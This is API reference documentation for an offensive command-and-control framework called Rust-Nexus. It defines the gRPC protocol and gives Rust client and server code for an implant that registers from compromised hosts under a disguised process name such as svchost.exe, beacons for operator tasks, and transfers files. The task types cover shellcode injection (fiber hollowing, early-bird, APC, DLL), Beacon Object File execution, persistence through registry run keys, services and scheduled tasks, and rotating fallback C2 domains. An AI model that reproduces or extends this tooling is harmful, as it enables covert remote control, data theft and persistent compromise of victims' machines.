# gRPC API Reference

This document provides comprehensive reference for the Rust-Nexus gRPC API defined in `nexus-infra/proto/nexus.proto`.

## Service Overview

The `NexusC2` service provides the main interface for agent-server communication over gRPC with mutual TLS.

```protobuf
service NexusC2 {
  // Agent lifecycle management
  rpc RegisterAgent(RegistrationRequest) returns (RegistrationResponse);
  rpc Heartbeat(HeartbeatRequest) returns (HeartbeatResponse);
  rpc GetAgentInfo(AgentInfoRequest) returns (AgentInfoResponse);

  // Task management with streaming
  rpc GetTasks(TaskRequest) returns (stream Task);
  rpc SubmitTaskResult(TaskResult) returns (TaskResultResponse);

  // File operations with chunked streaming
  rpc UploadFile(stream FileChunk) returns (FileUploadResponse);
  rpc DownloadFile(FileDownloadRequest) returns (stream FileChunk);

  // Advanced execution capabilities
  rpc ExecuteShellcode(ShellcodeRequest) returns (ShellcodeResponse);
  rpc ExecuteBOF(BOFRequest) returns (BOFResponse);
}
```

## Agent Registration

### RegisterAgent

Registers a new agent with the C2 server and receives configuration.

**Request:**
```protobuf
message RegistrationRequest {
  string hostname = 1;          // Target system hostname
  string os_type = 2;           // "Windows", "Linux", "macOS"
  string os_version = 3;        // OS version string
  string ip_address = 4;        // Internal IP address
  string username = 5;          // Current username
  uint32 process_id = 6;        // Agent process ID
  string process_name = 7;      // Agent process name
  string architecture = 8;     // "x64", "x86", "arm64"
  repeated string capabilities = 9;  // ["fiber", "bof", "injection"]
  string public_key = 10;      // Agent's public key for additional crypto
}
```

**Response:**
```protobuf
message RegistrationResponse {
  string agent_id = 1;         // Unique agent identifier
  bool success = 2;            // Registration status
  string message = 3;          // Status message
  repeated string assigned_domains = 4; // Fallback C2 domains
  ConfigUpdate config = 5;     // Initial configuration
}
```

**Example Usage:**
```rust
use nexus_infra::proto::*;

let registration_request = RegistrationRequest {
    hostname: "WORKSTATION-01".to_string(),
    os_type: "Windows".to_string(),
    os_version: "10.0.19045".to_string(),
    ip_address: "192.168.1.100".to_string(),
    username: "user".to_string(),
    process_id: std::process::id(),
    process_name: "svchost.exe".to_string(),
    architecture: "x64".to_string(),
    capabilities: vec!["fiber".to_string(), "bof".to_string()],
    public_key: agent_public_key,
};

let response = grpc_client.register_agent(registration_request).await?;
println!("Registered as agent: {}", response.agent_id);
```

## Heartbeat & Health

### Heartbeat

Maintains agent connectivity and reports system status.

**Request:**
```protobuf
message HeartbeatRequest {
  string agent_id = 1;               // Agent identifier
  SystemStatus status = 2;           // Current system status
  repeated TaskStatus task_statuses = 3; // Task execution updates
}

message SystemStatus {
  double cpu_usage = 1;              // CPU utilization percentage
  uint64 memory_usage_mb = 2;        // Memory usage in MB
  uint64 disk_free_mb = 3;           // Free disk space in MB
  repeated NetworkInterface interfaces = 4; // Network interfaces
  repeated ProcessInfo running_processes = 5; // Running processes
}
```

**Response:**
```protobuf
message HeartbeatResponse {
  bool success = 1;                  // Heartbeat acknowledgment
  uint32 heartbeat_interval = 2;     // Next heartbeat interval (seconds)
  repeated string new_domains = 3;   // Updated domain list
  ConfigUpdate config_update = 4;    // Configuration changes
}
```

**Example Usage:**
```rust
// Send periodic heartbeat
let heartbeat_request = HeartbeatRequest {
    agent_id: agent_id.clone(),
    status: Some(SystemStatus {
        cpu_usage: get_cpu_usage(),
        memory_usage_mb: get_memory_usage(),
        disk_free_mb: get_disk_free(),
        interfaces: get_network_interfaces(),
        running_processes: get_process_list(),
    }),
    task_statuses: get_task_updates(),
};

let response = grpc_client.heartbeat(heartbeat_request).await?;
if !response.new_domains.is_empty() {
    update_domain_list(&response.new_domains).await?;
}
```

## Task Management

### GetTasks

Receives tasks from the C2 server via streaming.

**Request:**
```protobuf
message TaskRequest {
  string agent_id = 1;    // Agent requesting tasks
  uint32 max_tasks = 2;   // Maximum tasks to return
}
```

**Response (Stream):**
```protobuf
message Task {
  string task_id = 1;                    // Unique task identifier
  TaskType task_type = 2;                // Task type enum
  string command = 3;                    // Command to execute
  map<string, string> parameters = 4;    // Task parameters
  google.protobuf.Timestamp created_at = 5;      // Creation time
  google.protobuf.Timestamp scheduled_for = 6;   // Scheduled execution time
  uint32 timeout_seconds = 7;            // Execution timeout
  uint32 priority = 8;                   // Task priority (0-255)
  uint32 max_retries = 9;                // Maximum retry attempts
}
```

**Example Usage:**
```rust
// Request tasks from server
let task_request = TaskRequest {
    agent_id: agent_id.clone(),
    max_tasks: 5, // Request up to 5 tasks
};

let tasks = grpc_client.get_tasks(task_request).await?;
for task in tasks {
    println!("Received task: {} ({})", task.task_id, task.command);

    // Execute task based on type
    let result = match task.task_type() {
        TaskType::ShellCommand => execute_shell_command(&task).await?,
        TaskType::BofExecution => execute_bof_task(&task).await?,
        TaskType::FiberShellcode => execute_fiber_task(&task).await?,
        _ => execute_generic_task(&task).await?,
    };

    // Submit result back to server
    submit_task_result(task.task_id, result).await?;
}
```

### SubmitTaskResult

Submits task execution results to the C2 server.

**Request:**
```protobuf
message TaskResult {
  string task_id = 1;                    // Task identifier
  string agent_id = 2;                   // Agent identifier
  TaskExecutionStatus status = 3;        // Execution status
  string output = 4;                     // Command output
  string error_message = 5;              // Error message if failed
  google.protobuf.Timestamp start_time = 6;      // Execution start time
  google.protobuf.Timestamp end_time = 7;        // Execution end time
  uint64 execution_duration_ms = 8;      // Duration in milliseconds
  int32 exit_code = 9;                   // Exit code
  repeated TaskArtifact artifacts = 10;   // Additional artifacts
}
```

**Response:**
```protobuf
message TaskResultResponse {
  bool success = 1;       // Result submission status
  string message = 2;     // Status message
}
```

## Advanced Execution

### ExecuteBOF

Executes Beacon Object Files with argument marshalling.

**Request:**
```protobuf
message BOFRequest {
  string agent_id = 1;              // Target agent
  bytes bof_data = 2;               // COFF file data
  string function_name = 3;         // Entry point function
  repeated BOFArgument arguments = 4; // Function arguments
  map<string, string> options = 5;   // Execution options
}

message BOFArgument {
  BOFArgumentType type = 1;         // Argument type
  bytes value = 2;                  // Argument value
}

enum BOFArgumentType {
  BOF_ARGUMENT_TYPE_UNSPECIFIED = 0;
  BOF_ARGUMENT_TYPE_INT32 = 1;
  BOF_ARGUMENT_TYPE_INT16 = 2;
  BOF_ARGUMENT_TYPE_STRING = 3;
  BOF_ARGUMENT_TYPE_WSTRING = 4;
  BOF_ARGUMENT_TYPE_BINARY = 5;
}
```

**Example Usage:**
```rust
// Load BOF file
let bof_data = std::fs::read("whoami.obj")?;

// Create arguments
let arguments = vec![
    BofArgument {
        r#type: BofArgumentType::String.into(),
        value: "target_system".as_bytes().to_vec(),
    },
    BofArgument {
        r#type: BofArgumentType::Int32.into(),
        value: 1234i32.to_le_bytes().to_vec(),
    },
];

// Execute BOF
let bof_request = BofRequest {
    agent_id: "agent-123".to_string(),
    bof_data,
    function_name: "go".to_string(),
    arguments,
    options: HashMap::new(),
};

let response = grpc_client.execute_bof(bof_request).await?;
println!("BOF executed: {} - {}", response.success, response.output);
```

### ExecuteShellcode

Executes shellcode using various injection methods including fiber techniques.

**Request:**
```protobuf
message ShellcodeRequest {
  string agent_id = 1;                    // Target agent
  bytes shellcode = 2;                    // Shellcode bytes
  ShellcodeExecutionMethod method = 3;     // Execution method
  string target_process = 4;              // Target process for injection
  uint32 target_pid = 5;                  // Target process ID
  map<string, string> options = 6;        // Execution options
}

enum ShellcodeExecutionMethod {
  SHELLCODE_EXECUTION_METHOD_UNSPECIFIED = 0;
  SHELLCODE_EXECUTION_METHOD_DIRECT_FIBER = 1;
  SHELLCODE_EXECUTION_METHOD_FIBER_HOLLOWING = 2;
  SHELLCODE_EXECUTION_METHOD_EARLY_BIRD = 3;
  SHELLCODE_EXECUTION_METHOD_PROCESS_INJECTION = 4;
  SHELLCODE_EXECUTION_METHOD_APC_INJECTION = 5;
  SHELLCODE_EXECUTION_METHOD_DLL_INJECTION = 6;
}
```

## File Operations

### UploadFile / DownloadFile

Streaming file transfer operations with chunked data and integrity checking.

**Upload Request (Stream):**
```protobuf
message FileChunk {
  string filename = 1;    // File name
  bytes data = 2;         // Chunk data
  uint64 offset = 3;      // Chunk offset in file
  uint64 total_size = 4;  // Total file size
  string checksum = 5;    // SHA-256 of complete file
}
```

**Example File Upload:**
```rust
// Upload file in chunks
let file_data = std::fs::read("payload.exe")?;
let chunk_size = 64 * 1024; // 64KB chunks
let total_size = file_data.len() as u64;

let mut chunks = Vec::new();
for (i, chunk) in file_data.chunks(chunk_size).enumerate() {
    let file_chunk = FileChunk {
        filename: "payload.exe".to_string(),
        data: chunk.to_vec(),
        offset: (i * chunk_size) as u64,
        total_size,
        checksum: if i == 0 { calculate_sha256(&file_data) } else { String::new() },
    };
    chunks.push(file_chunk);
}

let response = grpc_client.upload_file(chunks).await?;
println!("Upload successful: {}", response.file_id);
```

## Task Types

### Standard Tasks

```protobuf
enum TaskType {
  TASK_TYPE_SHELL_COMMAND = 1;
  TASK_TYPE_POWERSHELL_COMMAND = 2;
  TASK_TYPE_FILE_UPLOAD = 3;
  TASK_TYPE_FILE_DOWNLOAD = 4;
  TASK_TYPE_DIRECTORY_LISTING = 5;
  TASK_TYPE_PROCESS_LIST = 6;
  TASK_TYPE_SYSTEM_INFO = 7;
  TASK_TYPE_NETWORK_INFO = 8;
  TASK_TYPE_REGISTRY_QUERY = 9;
  TASK_TYPE_REGISTRY_SET = 10;
  TASK_TYPE_SERVICE_CONTROL = 11;
}
```

### Advanced Execution Tasks

```protobuf
enum TaskType {
  TASK_TYPE_FIBER_SHELLCODE = 20;      // Direct fiber execution
  TASK_TYPE_FIBER_HOLLOWING = 21;      // Process hollowing with fibers
  TASK_TYPE_PROCESS_INJECTION = 22;    // Standard process injection
  TASK_TYPE_DLL_INJECTION = 23;        // DLL injection
  TASK_TYPE_APC_INJECTION = 24;        // APC queue injection
  TASK_TYPE_EARLY_BIRD_INJECTION = 25; // Early bird injection
  TASK_TYPE_BOF_EXECUTION = 26;        // BOF execution
  TASK_TYPE_COFF_LOADING = 27;         // COFF loading
}
```

### Persistence Tasks

```protobuf
enum TaskType {
  TASK_TYPE_REGISTRY_PERSISTENCE = 30;    // Registry run keys
  TASK_TYPE_SERVICE_PERSISTENCE = 31;     // Windows service
  TASK_TYPE_TASK_SCHEDULER_PERSISTENCE = 32; // Scheduled tasks
  TASK_TYPE_STARTUP_PERSISTENCE = 33;     // Startup folder
}
```

## Error Handling

### Status Codes

```protobuf
enum TaskExecutionStatus {
  TASK_EXECUTION_STATUS_PENDING = 1;     // Waiting to execute
  TASK_EXECUTION_STATUS_RUNNING = 2;     // Currently executing
  TASK_EXECUTION_STATUS_COMPLETED = 3;   // Successfully completed
  TASK_EXECUTION_STATUS_FAILED = 4;      // Execution failed
  TASK_EXECUTION_STATUS_TIMEOUT = 5;     // Execution timed out
  TASK_EXECUTION_STATUS_CANCELLED = 6;   // Cancelled by operator
}
```

### Error Response Examples

```rust
// Handle gRPC errors
match grpc_client.register_agent(request).await {
    Ok(response) => {
        if response.success {
            println!("Registration successful: {}", response.agent_id);
        } else {
            eprintln!("Registration failed: {}", response.message);
        }
    }
    Err(status) => {
        match status.code() {
            tonic::Code::Unauthenticated => {
                eprintln!("Authentication failed - check certificates");
            }
            tonic::Code::Unavailable => {
                eprintln!("Server unavailable - trying backup domain");
                grpc_client.rotate_endpoint().await?;
            }
            tonic::Code::DeadlineExceeded => {
                eprintln!("Request timeout - server may be overloaded");
            }
            _ => eprintln!("gRPC error: {}", status.message()),
        }
    }
}
```

## Configuration Updates

### Dynamic Configuration

The server can push configuration updates to agents:

```protobuf
message ConfigUpdate {
  repeated string c2_domains = 1;        // Updated C2 domain list
  uint32 heartbeat_interval = 2;         // New heartbeat interval
  uint32 max_retry_attempts = 3;         // Retry configuration
  map<string, string> settings = 4;      // Additional settings
  CertificateUpdate certificate_update = 5; // Certificate updates
}

message CertificateUpdate {
  bytes certificate = 1;                 // New certificate
  bytes private_key = 2;                  // New private key
  bytes ca_certificate = 3;               // New CA certificate
  google.protobuf.Timestamp expires_at = 4; // Expiration time
}
```

**Example Usage:**
```rust
// Handle configuration updates in heartbeat response
if let Some(config_update) = heartbeat_response.config_update {
    // Update domain list
    if !config_update.c2_domains.is_empty() {
        agent.update_domains(&config_update.c2_domains).await?;
    }

    // Update heartbeat interval
    if config_update.heartbeat_interval > 0 {
        agent.set_heartbeat_interval(config_update.heartbeat_interval);
    }

    // Update certificates
    if let Some(cert_update) = config_update.certificate_update {
        agent.update_certificates(cert_update).await?;
    }
}
```

## Implementation Notes

### gRPC Namespace Structure

The Rust-Nexus gRPC implementation uses tonic-generated code from the `nexus.v1` protobuf package. All generated types are accessible through the `proto` module:

**Important**: When working with the protobuf-generated code, use explicit imports to avoid namespace issues:

```rust
// Correct: Use explicit imports from the proto module
use crate::proto::{
    nexus_c2_server, nexus_c2_client,
    RegistrationRequest, RegistrationResponse,
    HeartbeatRequest, HeartbeatResponse,
    TaskRequest, Task, TaskResult, TaskResultResponse,
    // ... other message types
};

// Then use directly without proto:: prefix
let client = nexus_c2_client::NexusC2Client::new(channel);
let server = nexus_c2_server::NexusC2Server::new(service);
```

**Common Issues**: If you encounter compilation errors like `failed to resolve: use of unresolved module or unlinked crate 'proto'`, ensure:

1. You have the correct import statements
2. The tonic build process has completed successfully
3. Your namespace references match the structure defined in `lib.rs`

**Reference**: For complete namespace troubleshooting, see [gRPC Namespace Fix Guide](../troubleshooting/GRPC_NAMESPACE_FIX.md).

### Service Implementation Pattern

When implementing the gRPC service trait, use the correct namespace structure:

```rust
// Server implementation
#[tonic::async_trait]
impl nexus_c2_server::NexusC2 for NexusC2Service {
    async fn register_agent(
        &self,
        request: Request<RegistrationRequest>,
    ) -> Result<Response<RegistrationResponse>, Status> {
        // Implementation here
    }
    // ... other methods
}

// Service registration
let service = NexusC2Service::new(/* dependencies */);
let server = Server::builder()
    .add_service(nexus_c2_server::NexusC2Server::new(service))
    .serve(addr);
```

## Client Implementation

### Basic gRPC Client

```rust
use nexus_infra::{GrpcClient, GrpcClientConfig, CertManager, DomainManager};
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Setup certificate manager
    let cert_config = OriginCertConfig::default();
    let cert_manager = Arc::new(CertManager::new(cert_config)?);

    // Setup domain manager
    let domain_config = DomainConfig::default();
    let cf_manager = CloudflareManager::new(CloudflareConfig::default())?;
    let domain_manager = Arc::new(DomainManager::new(domain_config, cf_manager).await?);

    // Create gRPC client
    let client_config = GrpcClientConfig::default();
    let mut grpc_client = GrpcClient::new(client_config, cert_manager, domain_manager);

    // Connect to server
    grpc_client.connect().await?;

    // Agent main loop
    loop {
        // Send heartbeat
        let heartbeat_response = grpc_client.heartbeat(create_heartbeat_request()).await?;

        // Get and execute tasks
        let tasks = grpc_client.get_tasks(TaskRequest {
            agent_id: agent_id.clone(),
            max_tasks: 10,
        }).await?;

        for task in tasks {
            let result = execute_task(task).await?;
            grpc_client.submit_task_result(result).await?;
        }

        // Sleep before next cycle
        tokio::time::sleep(Duration::from_secs(30)).await;
    }
}
```

### Server Implementation

```rust
use nexus_infra::{GrpcServer, GrpcServerConfig, CertManager};
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Setup certificate manager
    let cert_config = OriginCertConfig::default();
    let cert_manager = Arc::new(CertManager::new(cert_config)?);

    // Create and start gRPC server
    let server_config = GrpcServerConfig::default();
    let server = GrpcServer::new(server_config, cert_manager);

    // Start server
    server.start().await?;

    println!("gRPC C2 server started on port 443");

    // Keep server running
    tokio::signal::ctrl_c().await?;
    println!("Shutting down server...");
    server.stop().await?;

    Ok(())
}
```

## Authentication & Security

### Mutual TLS Setup

```rust
// Client-side certificate configuration
let tls_config = ClientTlsConfig::new()
    .ca_certificate(Certificate::from_pem(ca_cert_pem))
    .identity(Identity::from_pem(client_cert_pem, client_key_pem));

// Server-side certificate configuration
let tls_config = ServerTlsConfig::new()
    .identity(Identity::from_pem(server_cert_pem, server_key_pem))
    .client_ca_root(ca_cert_pem);
```

### Certificate Pinning

```rust
// Verify certificate fingerprint
let expected_fingerprint = "sha256:1234567890abcdef...";
let actual_fingerprint = calculate_cert_fingerprint(&peer_cert);

if expected_fingerprint != actual_fingerprint {
    return Err(InfraError::TlsError("Certificate pinning validation failed"));
}
```

## Monitoring & Debugging

### Enable Debug Logging

```rust
// Enable comprehensive gRPC debugging
std::env::set_var("RUST_LOG", "nexus_infra=debug,tonic=debug");
env_logger::init();

// gRPC operations will now produce detailed logs
```

### Connection Health Monitoring

```rust
// Monitor connection health
tokio::spawn(async move {
    let mut interval = tokio::time::interval(Duration::from_secs(30));

    loop {
        interval.tick().await;

        if !grpc_client.health_check().await? {
            warn!("gRPC connection unhealthy, attempting rotation");
            grpc_client.rotate_endpoint().await?;
        }
    }
});
```

## Performance Optimization

### Connection Pooling

```rust
// Configure connection pooling
let client_config = GrpcClientConfig {
    connect_timeout: Duration::from_secs(10),
    request_timeout: Duration::from_secs(30),
    max_retry_attempts: 3,
    keepalive_interval: Duration::from_secs(60),
    ..Default::default()
};
```

### Streaming Optimization

```rust
// Optimize streaming for large data transfers
let mut stream = grpc_client.download_file(FileDownloadRequest {
    agent_id: agent_id.clone(),
    file_path: "large_file.exe".to_string(),
    offset: 0,
    chunk_size: 1024 * 1024, // 1MB chunks for better performance
}).await?;

let mut file_data = Vec::new();
while let Some(chunk) = stream.message().await? {
    file_data.extend_from_slice(&chunk.data);
}
```

## Best Practices

### **Connection Management**
- Always implement connection retry logic
- Use connection pooling for high-throughput scenarios
- Monitor connection health continuously
- Implement graceful degradation for connectivity issues

### **Error Handling**
- Handle all gRPC status codes appropriately
- Implement exponential backoff for retries
- Log errors for debugging and monitoring
- Provide meaningful error messages to operators

### **Security**
- Always use mutual TLS in production
- Implement certificate pinning validation
- Rotate certificates regularly
- Monitor for unusual connection patterns

### **Performance**
- Use appropriate chunk sizes for file transfers
- Implement streaming for large data sets
- Configure timeouts based on network conditions
- Monitor resource usage on both client and server

## Next Steps

1. **[Infrastructure Setup](../infrastructure/README.md)** - Setup gRPC infrastructure
2. **[Production Deployment](../configuration/production-setup.md)** - Production configuration
3. **[Security Hardening](../configuration/security-hardening.md)** - Security best practices
4. **[Monitoring Guide](../operations/monitoring.md)** - gRPC monitoring and alerting
